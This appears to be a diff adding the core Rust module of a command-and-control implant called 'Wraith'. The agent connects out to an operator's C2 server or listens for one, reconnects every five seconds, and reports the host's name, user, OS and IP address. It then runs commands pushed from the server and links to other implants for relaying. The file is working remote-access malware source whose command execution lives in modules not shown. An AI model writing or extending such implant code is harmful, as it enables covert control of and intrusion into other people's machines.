@@ -1,0 +1,253 @@
+use crate::connection::tcp::TcpConnection;
+use crate::message::codec::MessageCodec;
+use crate::proto::wraith::MessageType;
+use crate::relay::RelayManager;
+use crate::wraith::state::WraithState;
+use crate::wraith::session::{PeerEvent, TunnelManager};
+use crate::commands::agent::AgentCommands;
+use crate::commands::relay::RelayCommands;
+use log::{error, info};
+use std::sync::{Arc, Mutex};
+use tokio::sync::mpsc;
+
+#[derive(Debug, thiserror::Error)]
+pub enum WraithError {
+    #[error("No C2 connection set for wraith!")]
+    NoConnection,
+    #[error("{0}")]
+    Message(String),
+}
+
+/// Shared C2 message loop: reads from a connection, dispatches commands via the tunnel manager,
+/// and sends responses back.
+async fn run_c2_message_loop(
+    connection: &mut TcpConnection,
+    tunnel_manager: &Arc<TunnelManager>,
+) -> Result<(), Box<dyn std::error::Error>> {
+    loop {
+        match connection.read_message().await {
+            Ok(msg) => {
+                let msg_type = msg.msg_type;
+                match msg_type {
+                    x if x == MessageType::Command as i32 => {
+                        if let Some(response) = tunnel_manager.route_message(msg).await {
+                            connection.send_message(&response).await?;
+                        }
+                    }
+                    _ => {
+                        info!("Received message type: {}", msg_type);
+                    }
+                }
+            }
+            Err(e) => {
+                error!("Read failed: {}", e);
+                break;
+            }
+        }
+    }
+    Ok(())
+}
+
+pub struct Wraith {
+    connection: Option<TcpConnection>,
+    state: Arc<Mutex<WraithState>>,
+    tunnel_manager: Arc<TunnelManager>,
+    agent_mode: bool,
+    peer_listen_addr: Option<String>,
+    peer_connect_addr: Option<String>,
+}
+
+impl Wraith {
+    pub fn new(wraith_id: &String) -> Self {
+        let relay_manager = Arc::new(Mutex::new(RelayManager::new()));
+        let state = Arc::new(Mutex::new(WraithState::new(
+            wraith_id.clone(),
+            Arc::clone(&relay_manager),
+        )));
+
+        // Create peer event channel
+        let (peer_event_tx, mut peer_event_rx) = mpsc::channel::<PeerEvent>(100);
+
+        // Create TunnelManager with state injection and peer event channel
+        let tunnel_manager = Arc::new(TunnelManager::new(Arc::clone(&state), peer_event_tx));
+
+        // Create commands with reference to tunnel_manager
+        let relay_commands = RelayCommands::new(Arc::clone(&relay_manager), Arc::clone(&tunnel_manager));
+        let agent_commands = AgentCommands::new(Arc::clone(&tunnel_manager));
+
+        // Set commands on tunnel_manager (two-phase init for circular dep)
+        tunnel_manager.set_commands(relay_commands, agent_commands);
+
+        // Spawn task to handle peer events and update state
+        let state_for_events = Arc::clone(&state);
+        tokio::spawn(async move {
+            while let Some(event) = peer_event_rx.recv().await {
+                match event {
+                    PeerEvent::Added { wraith_id, hostname, sender } => {
+                        state_for_events.lock().expect("state lock poisoned")
+                            .add_peer(wraith_id, hostname, sender);
+                    }
+                    PeerEvent::Removed { wraith_id } => {
+                        state_for_events.lock().expect("state lock poisoned")
+                            .remove_peer(&wraith_id);
+                    }
+                }
+            }
+        });
+
+        Self {
+            connection: None,
+            state,
+            tunnel_manager,
+            agent_mode: false,
+            peer_listen_addr: None,
+            peer_connect_addr: None,
+        }
+    }
+
+    pub fn create_connection(&mut self, host: String, port: u16, is_server: bool) {
+        self.connection = Some(TcpConnection::new(host, port, is_server));
+    }
+
+    pub fn is_connected(&self) -> bool {
+        self.connection.as_ref().map(|c| c.is_connected()).unwrap_or(false)
+    }
+
+    pub fn state(&self) -> Arc<Mutex<WraithState>> {
+        Arc::clone(&self.state)
+    }
+
+    pub fn tunnel_manager(&self) -> Arc<TunnelManager> {
+        Arc::clone(&self.tunnel_manager)
+    }
+
+    /// Main run loop - handles C2 connection (server or client based on connection type)
+    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
+        let connection = match &mut self.connection {
+            Some(c) => c,
+            None => {
+                error!("No C2 connection set for wraith!");
+                return Err(Box::from(WraithError::NoConnection));
+            }
+        };
+
+        if connection.is_server() {
+            connection.listen().await?;
+        } else {
+            connection.connect().await?;
+        }
+
+        self.state.lock().expect("state lock poisoned").set_connected(true);
+        self.register().await?;
+
+        let connection = self.connection.as_mut().ok_or(WraithError::NoConnection)?;
+        run_c2_message_loop(connection, &self.tunnel_manager).await?;
+
+        self.state.lock().expect("state lock poisoned").set_connected(false);
+        Ok(())
+    }
+
+    /// Agent listener mode: C2 listens for connections, peer listener runs concurrently
+    /// This method blocks - spawn it as a task if you need to do other things
+    pub async fn run_c2_listener(&self, c2_addr: String) {
+        let state = Arc::clone(&self.state);
+        let tunnel_manager = Arc::clone(&self.tunnel_manager);
+
+        loop {
+            info!("C2 listener waiting for connection on {}", c2_addr);
+
+            match tokio::net::TcpListener::bind(&c2_addr).await {
+                Ok(listener) => {
+                    match listener.accept().await {
+                        Ok((stream, peer_addr)) => {
+                            info!("C2 connected from: {}", peer_addr);
+                            let state = Arc::clone(&state);
+                            let tunnel_manager = tunnel_manager.clone();
+
+                            tokio::spawn(async move {
+                                if let Err(e) = Self::handle_c2_connection(stream, state, tunnel_manager).await {
+                                    error!("C2 handler error: {}", e);
+                                }
+                            });
+                        }
+                        Err(e) => {
+                            error!("Failed to accept C2 connection: {}", e);
+                        }
+                    }
+                }
+                Err(e) => {
+                    error!("Failed to bind C2 listener on {}: {}", c2_addr, e);
+                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+                }
+            }
+        }
+    }
+
+    /// Handle a single C2 connection
+    async fn handle_c2_connection(
+        stream: tokio::net::TcpStream,
+        state: Arc<Mutex<WraithState>>,
+        tunnel_manager: Arc<crate::wraith::session::TunnelManager>,
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        let mut connection = TcpConnection::from_stream(stream);
+
+        // Get registration data before locking
+        let (hostname, username, os, ip_address) = {
+            let mut s = state.lock().expect("state lock poisoned");
+            s.set_connected(true);
+            (s.hostname.clone(), s.username.clone(), s.os.clone(), s.ip_address.clone())
+        };
+
+        // Send registration
+        let msg = MessageCodec::create_registration(hostname, username, os, ip_address);
+        connection.send_message(&msg).await?;
+        info!("Registration sent to C2");
+
+        run_c2_message_loop(&mut connection, &tunnel_manager).await?;
+
+        state.lock().expect("state lock poisoned").set_connected(false);
+        Ok(())
+    }
+
+    /// Agent connect mode: connect to C2 with automatic reconnection
+    /// Also spawns peer connection which should be handled separately
+    pub async fn run_c2_client(&self, host: String, port: u16) {
+        let state = Arc::clone(&self.state);
+        let tunnel_manager = Arc::clone(&self.tunnel_manager);
+
+        loop {
+            let addr = format!("{}:{}", host, port);
+            info!("C2 client connecting to {}", addr);
+
+            match tokio::net::TcpStream::connect(&addr).await {
+                Ok(stream) => {
+                    info!("C2 client connected to {}", addr);
+                    match Self::handle_c2_connection(stream, Arc::clone(&state), tunnel_manager.clone()).await {
+                        Ok(_) => info!("C2 connection closed gracefully"),
+                        Err(e) => error!("C2 connection error: {}", e),
+                    }
+                }
+                Err(e) => {
+                    error!("Failed to connect to C2 at {}: {}", addr, e);
+                }
+            }
+
+            info!("C2 client reconnecting in 5 seconds...");
+            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+        }
+    }
+
+    async fn register(&mut self) -> Result<(), Box<dyn std::error::Error>> {
+        let (hostname, username, os, ip_address) = {
+            let state = self.state.lock().expect("state lock poisoned");
+            (state.hostname.clone(), state.username.clone(), state.os.clone(), state.ip_address.clone())
+        };
+
+        let msg = MessageCodec::create_registration(hostname, username, os, ip_address);
+        if let Some(conn) = &mut self.connection {
+            conn.send_message(&msg).await?;
+            info!("Registration sent");
+        }
+        Ok(())
+    }
+}
